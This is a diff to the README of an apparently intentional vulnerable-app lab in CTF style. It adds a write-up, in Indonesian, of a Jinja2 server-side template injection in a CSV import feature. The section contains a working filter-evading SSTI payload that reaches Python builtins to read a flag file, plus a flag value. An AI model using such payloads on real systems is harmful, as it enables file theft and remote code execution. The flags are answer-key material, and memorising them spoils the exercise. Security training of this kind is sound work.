@@ -57,7 +57,7 @@ docker compose up --build -d
 | Nslookup    | 5001   | http://localhost:5001      | Command Injection   |
 | GaG Wiki    | 5002   | http://localhost:5002      | SQL Injection       |
 | SVG Viewer  | 8888   | http://localhost:8888      | XXE Injection       |
-| PassForge   | 8120   | http://localhost:8120      | TBD                 |
+| PassForge   | 8120   | http://localhost:8120      | SSTI Injection      |
 
 ---
 
@@ -112,6 +112,23 @@ python svg-viewer/exploit/svgviewer_exploit.py http://localhost:8888
   </svg>
   ```
 - **Flag:** `LEEXY{670ef0276339a9989da10a47d46a6115}`
+
+### 5. PassForge (SSTI Injection)
+- **Kerentanan:** Server-Side Template Injection pada fitur Smart Import
+- **Deskripsi:** Aplikasi memproses file CSV yang diunggah dan merender isinya menggunakan Jinja2, memungkinkan RCE atau pembacaan file lokal.
+- **Payload:** 
+```python
+SSTI_PAYLOAD = (
+    "template\n"
+    '{%set a="_"%}'
+    '{%set f="/fl"%}'
+    '{%set g="ag.txt"%}'
+    '{%set bl=cycler|attr(a+a+"init"+a+a)|attr(a+a+"globals"+a+a)'
+    '|attr(a+a+"getitem"+a+a)(a+a+"builtins"+a+a)%}'
+    '{{bl|attr(a+a+"getitem"+a+a)("open")(f+g)|attr("read")()}}'
+)
+```
+- **Flag:** `LEEXY{passforge_placeholder_flag}`
 
 ---
 
